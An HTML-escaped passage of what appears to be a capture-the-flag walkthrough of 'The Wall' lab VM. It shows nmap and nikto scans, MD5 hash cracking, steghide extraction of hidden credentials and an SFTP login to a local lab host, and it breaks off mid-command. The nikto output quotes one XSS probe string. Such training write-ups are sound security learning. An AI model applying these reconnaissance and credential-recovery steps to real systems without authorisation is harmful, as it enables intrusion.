         &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$$&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;@  R&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;H :RP' &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$b&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;     X    @'
         9&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$E&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;  @Bd' &lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$'&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;   ?X     ;    W
         &lt;/span&gt;&lt;span class=&quot;sb&quot;&gt;`&lt;/span&gt;M&lt;span class=&quot;s1&quot;&gt;'  `$M d$    `E    ;.o* :R   ..
          `    '&lt;/span&gt;  &lt;span class=&quot;s2&quot;&gt;&quot;'     '    @'   '&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;$o&lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;*&quot;&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'   

              The Wall by @xerubus
          -= Welcome to the Machine =-

If you should go skating on the thin ice of modern life, dragging behind you the silent reproach of a million tear-stained eyes, don'&lt;/span&gt;t be surprised when a crack &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;the ice appears under your feet. - Pink Floyd, The Thin Ice&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Great, our first piece of information. Another &lt;b&gt;nmap&lt;/b&gt; scan revealed that this operation triggered an port opening, &lt;b&gt;http&lt;/b&gt; is up. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~# nmap &lt;span class=&quot;nt&quot;&gt;-v&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sS&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-A&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-T4&lt;/span&gt; 192.168.56.103

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-08-02 10:35 EDT
NSE: Loaded 132 scripts &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;scanning.
NSE: Script Pre-scanning.
Initiating NSE at 10:35
Completed NSE at 10:35, 0.00s elapsed
Initiating NSE at 10:35
Completed NSE at 10:35, 0.00s elapsed
Initiating ARP Ping Scan at 10:35
Scanning 192.168.56.103 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1 port]
Completed ARP Ping Scan at 10:35, 0.21s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 total hosts&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
Initiating SYN Stealth Scan at 10:35
Scanning 192.168.56.103 &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;1000 ports]
Discovered open port 80/tcp on 192.168.56.103
Completed SYN Stealth Scan at 10:35, 12.25s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1000 total ports&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating Service scan at 10:35
Scanning 1 service on 192.168.56.103
Completed Service scan at 10:37, 96.21s elapsed &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 service on 1 host&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Initiating OS detection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;try &lt;span class=&quot;c&quot;&gt;#1) against 192.168.56.103&lt;/span&gt;
NSE: Script scanning 192.168.56.103.
Initiating NSE at 10:37
Completed NSE at 10:37, 7.19s elapsed
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.103
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00081s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 999 filtered ports
PORT   STATE SERVICE VERSION
80/tcp open  http    OpenBSD httpd
| http-methods:
|_  Supported Methods: GET HEAD
|_http-server-header: OpenBSD httpd
|_http-title: Site doesn&lt;span class=&quot;s1&quot;&gt;'t have a title (text/html).
MAC Address: 08:00:27:B1:35:60 (Oracle VirtualBox virtual NIC)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: OpenBSD 5.X
OS CPE: cpe:/o:openbsd:openbsd:5
OS details: OpenBSD 5.0 - 5.4, OpenBSD 5.3
Uptime guess: 0.000 days (since Wed Aug  2 10:37:21 2017)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: Randomized

TRACEROUTE
HOP RTT     ADDRESS
1   0.81 ms 192.168.56.103

NSE: Script Post-scanning.
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
Initiating NSE at 10:37
Completed NSE at 10:37, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 118.93 seconds
           Raw packets sent: 3051 (136.796KB) | Rcvd: 20 (1.024KB)&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let's take a look at the website. &lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/img/the-wall/website.png&quot; alt=&quot;Website&quot; class=&quot;img-responsive center-block&quot; /&gt;&lt;/p&gt;

&lt;p&gt;And it's code. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-html&quot; data-lang=&quot;html&quot;&gt;&lt;span class=&quot;nt&quot;&gt;&amp;lt;html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;body&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;bgcolor=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;#000000&quot;&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;center&amp;gt;&amp;lt;img&lt;/span&gt; &lt;span class=&quot;na&quot;&gt;src=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;pink_floyd.jpg&quot;&lt;/span&gt;&lt;span class=&quot;err&quot;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&quot;na&quot;&gt;img&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&amp;gt;&amp;lt;/center&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/body&amp;gt;&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;&amp;lt;/html&amp;gt;&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;&amp;lt;!--If you want to find out what's behind these cold eyes, you'll just have to claw your way through this disguise. - Pink Floyd, The Wall

Did you know? The Publius Enigma is a mystery surrounding the Division Bell album.  Publius promised an unspecified reward for solving the
riddle, and further claimed that there was an enigma hidden within the artwork.

737465673d3333313135373330646262623337306663626539373230666536333265633035--&amp;gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We have a hex string in a comment, which we can translate. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;737465673d3333313135373330646262623337306663626539373230666536333265633035
steg=33115730dbbb370fcbe9720fe632ec05&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But I have no clue about its use. My next step is to run &lt;b&gt;nikto&lt;/b&gt; in order to gain something more about the website. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# nikto &lt;span class=&quot;nt&quot;&gt;-h&lt;/span&gt; 192.168.56.103
- Nikto v2.1.6
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Target IP:          192.168.56.103
+ Target Hostname:    192.168.56.103
+ Target Port:        80
+ Start Time:         2017-08-02 10:43:24 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ Server: OpenBSD httpd
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;a different fashion to the MIME &lt;span class=&quot;nb&quot;&gt;type&lt;/span&gt;
+ Retrieved x-powered-by header: PHP/5.6.11
+ No CGI Directories found &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;use &lt;span class=&quot;s1&quot;&gt;'-C all'&lt;/span&gt; to force check all possible &lt;span class=&quot;nb&quot;&gt;dirs&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
+ /postnuke/modules.php?op&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;modload&amp;amp;name&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Web_Links&amp;amp;file&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;index&amp;amp;req&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;viewlinkdetails&amp;amp;lid&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;666&amp;amp;ttitle&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;Mocosoft Utilities&lt;span class=&quot;se&quot;&gt;\&quot;&lt;/span&gt;%3&amp;lt;script&amp;gt;alert&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s1&quot;&gt;'Vulnerable'&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&amp;lt;/script&amp;gt;: Postnuke Phoenix 0.7.2.3 is vulnerable to Cross Site Scripting &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;XSS&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; http://www.cert.org/advisories/CA-2000-02.html.
+ 7538 requests: 3 error&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; and 5 item&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; reported on remote host
+ End Time:           2017-08-02 10:44:01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;GMT-4&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;37 seconds&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;---------------------------------------------------------------------------&lt;/span&gt;
+ 1 host&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; tested&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Nothing here apart from some XSS vulnerability. Let's keep looking, maybe in the image? &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# exiftool index.jpeg
ExifTool Version Number         : 10.58
File Name                       : index.jpeg
Directory                       : &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
File Size                       : 112 kB
File Modification Date/Time     : 2017:08:02 10:42:39-04:00
File Access Date/Time           : 2017:08:02 10:42:39-04:00
File Inode Change Date/Time     : 2017:08:02 10:42:39-04:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
JFIF Version                    : 1.02
Resolution Unit                 : None
X Resolution                    : 100
Y Resolution                    : 100
Image Width                     : 750
Image Height                    : 717
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Image Size                      : 750x717
Megapixels                      : 0.538&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Unfortunately there's nothing here. After some thinking I came to to the program called &lt;b&gt;steghide&lt;/b&gt;, which allows you to hide information. Let's try this method. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# steghide &lt;span class=&quot;nt&quot;&gt;--extract&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sf&lt;/span&gt; index.jpeg
Enter passphrase:
steghide: could not extract any data with that passphrase!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;We need a password! I started analyzing all of the information and the previously decoded hex string looks like credentials. And good for us, it's &lt;b&gt;md5&lt;/b&gt; hashed. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;33115730dbbb370fcbe9720fe632ec05	md5	divisionbell&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now, we can use &lt;b&gt;steghide&lt;/b&gt; once again. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# steghide &lt;span class=&quot;nt&quot;&gt;--extract&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sf&lt;/span&gt; index.jpeg
Enter passphrase: divisionbell
wrote extracted data to &lt;span class=&quot;s2&quot;&gt;&quot;pink_floyd_syd.txt&quot;&lt;/span&gt;.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Let's view the data. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/Downloads# cat pink_floyd_syd.txt
Hey Syd,

I hear you're full of dust and guitars?

If you want to See Emily Play, just use this key: U3lkQmFycmV0dA==|f831605ae34c2399d1e5bb3a4ab245d0

Roger

Did you know? In 1965, The Pink Floyd Sound changed their name to Pink Floyd.  The name was inspired
by Pink Anderson and Floyd Council, two blues muscians on the Piedmont Blues record Syd Barret had in
his collection.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Another pass pair? This &lt;b&gt;base64&lt;/b&gt; strings decodes to username called &lt;b&gt;SydBarrett&lt;/b&gt;, and password hash is once again &lt;b&gt;md5&lt;/b&gt; - cracked into &lt;b&gt;pinkfloydrocks&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;U3lkQmFycmV0dA==    SydBarrett
f831605ae34c2399d1e5bb3a4ab245d0	md5	pinkfloydrocks
SydBarrett|pinkfloydrocks&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But what now? I decided to look for clues on &lt;b&gt;wikipedia&lt;/b&gt;, mentioning &quot;See Emily Play&quot;, but there was nothing that could help me right now. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&quot;See Emily Play&quot; is a song by English rock band Pink Floyd, released as their second single in June 1967. Written by original frontman Syd Barrett and recorded on 23 May 1967, it featured &quot;The Scarecrow&quot; as its B-side.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Luckily, doing another &lt;b&gt;nmap&lt;/b&gt; full port scan, I've discovered another open one - &lt;b&gt; port 1965&lt;/b&gt;. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# nmap &lt;span class=&quot;nt&quot;&gt;-p-&lt;/span&gt; 192.168.56.103

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-08-03 07:42 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.103
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0011s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Not shown: 65533 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
1965/tcp open  unknown
MAC Address: 08:00:27:B1:35:60 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;732.95 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Now we can scan what services are running on it. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# nmap &lt;span class=&quot;nt&quot;&gt;-sV&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 1965 192.168.56.103

Starting Nmap 7.01 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt; https://nmap.org &lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; at 2017-08-03 07:56 EDT
mass_dns: warning: Unable to determine any DNS servers. Reverse DNS is disabled. Try using &lt;span class=&quot;nt&quot;&gt;--system-dns&lt;/span&gt; or specify valid servers with &lt;span class=&quot;nt&quot;&gt;--dns-servers&lt;/span&gt;
Nmap scan report &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;192.168.56.103
Host is up &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.00075s latency&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
PORT     STATE SERVICE VERSION
1965/tcp open  ssh     OpenSSH 7.0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;protocol 2.0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
MAC Address: 08:00:27:B1:35:60 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Oracle VirtualBox virtual NIC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
Nmap &lt;span class=&quot;k&quot;&gt;done&lt;/span&gt;: 1 IP address &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 host up&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; scanned &lt;span class=&quot;k&quot;&gt;in &lt;/span&gt;1.26 seconds&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Hmmm, &lt;b&gt;ssh&lt;/b&gt; server. We can try connecting to it. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# ssh SydBarrett@192.168.56.103 &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; 1965
The authenticity of host &lt;span class=&quot;s1&quot;&gt;'[192.168.56.103]:1965 ([192.168.56.103]:1965)'&lt;/span&gt; can&lt;span class=&quot;s1&quot;&gt;'t be established.
ECDSA key fingerprint is SHA256:KpS9gjJLvMxkvJcWxmzby+XlbwCEA3aiRFNisoGiWlM.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;192.168.56.103]:1965&lt;span class=&quot;s1&quot;&gt;' (ECDSA) to the list of known hosts.
SydBarrett@192.168.56.103'&lt;/span&gt;s password:
Could not chdir to home directory /home/SydBarrett: No such file or directory
This service allows sftp connections only.
Connection to 192.168.56.103 closed.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;Only &lt;b&gt;sftp&lt;/b&gt;? Let's connect once again. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# sftp &lt;span class=&quot;nt&quot;&gt;-P&lt;/span&gt; 1965 SydBarrett@192.168.56.103
SydBarrett@192.168.56.103&lt;span class=&quot;s1&quot;&gt;'s password:
Connected to 192.168.56.103.
sftp&amp;gt; ls -la
drwxr-x---    3 0        1000          512 Aug  2  2017 .
drwxr-x---    3 0        1000          512 Oct 24  2015 ..
drwxr-xr-x    3 0        1000          512 Oct 24  2015 .mail
-rw-r--r--    1 0        1000         1912 Oct 25  2015 bio.txt
-rw-r--r--    1 0        1000       868967 Oct 24  2015 syd_barrett_profile_pic.jpg             
sftp&amp;gt; get bio.txt
Fetching /bio.txt to bio.txt
/bio.txt                                      100% 1912   434.8KB/s   00:00    
sftp&amp;gt; get syd_barrett_profile_pic.jpg
Fetching /syd_barrett_profile_pic.jpg to syd_barrett_profile_pic.jpg
/syd_barrett_profile_pic.jpg                  100%  849KB   7.6MB/s   00:00
sftp&amp;gt; cd .mail
sftp&amp;gt; ls -la
drwxr-xr-x    3 0        1000          512 Oct 24  2015 .
drwxr-x---    3 0        1000          512 Oct 24  2015 ..
drwxr-xr-x    2 0        1000          512 Nov 11  2015 .stash
-rw-r--r--    1 0        1000          309 Oct 24  2015 sent-items
sftp&amp;gt; get sent-items
Fetching /.mail/sent-items to sent-items
/.mail/sent-items                                                                                                   100%  309   140.9KB/s   00:00    
sftp&amp;gt; cd .stash
sftp&amp;gt; ls -la
drwxr-xr-x    2 0        1000          512 Nov 11  2015 .
drwxr-xr-x    3 0        1000          512 Oct 24  2015 ..
-rw-r--r--    1 0        1000     48884479 Aug  7  2015 eclipsed_by_the_moon
sftp&amp;gt; get eclipsed_by_the_moon
Fetching /.mail/.stash/eclipsed_by_the_moon to eclipsed_by_the_moon
/.mail/.stash/eclipsed_by_the_moon   
sftp&amp;gt; exit&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;And here's a lot of goodies. We got one text file, one image and one mail from that server. Now it's time  to investigate them. &lt;/p&gt;

&lt;p&gt;&lt;b&gt;bio.txt&lt;/b&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;root@kali:~/Downloads# cat bio.txt
&quot;Roger Keith &quot;Syd&quot; Barrett (6 January 1946 – 7 July 2006) was an English musician, composer, singer, songwriter, and painter. Best known as a founder member of the band Pink Floyd, Barrett was the lead singer, guitarist and principal songwriter in its early years and is credited with naming the band. Barrett was excluded from Pink Floyd in April 1968 after David Gilmour took over as their new frontman, and was briefly hospitalized amid speculation of mental illness.

Barrett was musically active for less than ten years. With Pink Floyd, he recorded four singles, their debut album (and contributed to the second one), and several unreleased songs. Barrett began his solo career in 1969 with the single &quot;Octopus&quot; from his first solo album, The Madcap Laughs (1970). The album was recorded over the course of a year with five different producers (Peter Jenner, Malcolm Jones, David Gilmour, Roger Waters and Barrett himself). Nearly two months after Madcap was released, Barrett began working on his second and final album, Barrett (1970), produced by Gilmour and featuring contributions from Richard Wright. He went into self-imposed seclusion until his death in 2006. In 1988, an album of unreleased tracks and outtakes, Opel, was released by EMI with Barrett's approval.

Barrett's innovative guitar work and exploration of experimental techniques such as dissonance, distortion and feedback influenced many musicians, including David Bowie and Brian Eno. His recordings are also noted for their strongly English-accented vocal delivery. After leaving music, Barrett continued with painting and dedicated himself to gardening. Biographies began appearing in the 1980s. Pink Floyd wrote and recorded several tributes to him, most notably the 1975 album Wish You Were Here, which included &quot;Shine On You Crazy Diamond&quot;, as homage to Barrett.&quot;

Source: Wikipedia (https://en.wikipedia.org/wiki/Syd_Barrett)&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;b&gt;syd_barrett_profile_pic.jpg&lt;/b&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# exiftool syd_barrett_profile_pic.jpg
ExifTool Version Number         : 10.58
File Name                       : syd_barrett_profile_pic.jpg
Directory                       : &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
File Size                       : 849 kB
File Modification Date/Time     : 2017:08:03 08:00:14-04:00
File Access Date/Time           : 2017:08:03 08:00:14-04:00
File Inode Change Date/Time     : 2017:08:03 08:00:14-04:00
File Permissions                : rw-r--r--
File Type                       : JPEG
File Type Extension             : jpg
MIME Type                       : image/jpeg
Exif Byte Order                 : Little-endian &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Intel, II&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Quality                         : 82%
XMP Toolkit                     : Adobe XMP Core 5.0-c060 61.134777, 2010/02/12-17:32:00
Creator Tool                    : Adobe Photoshop CS5 Windows
Instance ID                     : xmp.iid:E5450E5ADA2711E1A898C9AB7D94C9BA
Document ID                     : xmp.did:E5450E5BDA2711E1A898C9AB7D94C9BA
Derived From Instance ID        : xmp.iid:E5450E58DA2711E1A898C9AB7D94C9BA
Derived From Document ID        : xmp.did:E5450E59DA2711E1A898C9AB7D94C9BA
DCT Encode Version              : 100
APP14 Flags 0                   : &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;14], Encoded with &lt;span class=&quot;nv&quot;&gt;Blend&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1 downsampling
APP14 Flags 1                   : &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;none&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Color Transform                 : YCbCr
Image Width                     : 1920
Image Height                    : 1080
Encoding Process                : Baseline DCT, Huffman coding
Bits Per Sample                 : 8
Color Components                : 3
Y Cb Cr Sub Sampling            : YCbCr4:4:4 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;1 1&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Image Size                      : 1920x1080
Megapixels                      : 2.1&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# steghide &lt;span class=&quot;nt&quot;&gt;--extract&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-sf&lt;/span&gt; syd_barrett_profile_pic.jpg
Enter passphrase:
steghide: could not extract any data with that passphrase!&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But &lt;b&gt;eclipsed_by_the_moon&lt;/b&gt; is much better find. Let's unzip it. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# file eclipsed_by_the_moon
eclipsed_by_the_moon: gzip compressed data, last modified: Wed Nov 11 00:15:47 2015, from Unix
root@kali:~/Downloads# &lt;span class=&quot;nb&quot;&gt;tar &lt;/span&gt;zxvf eclipsed_by_the_moon
eclipsed_by_the_moon.lsd&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;What is this extension - &lt;b&gt;lsd&lt;/b&gt;?  Google suggests this. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;An LSD file may be a system dictionary supplied with Lingvo Dictionary or created by users.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;But &lt;b&gt;file&lt;/b&gt; command produces something else. &lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-bash&quot; data-lang=&quot;bash&quot;&gt;root@kali:~/Downloads# file eclipsed_by_the_moon.lsd
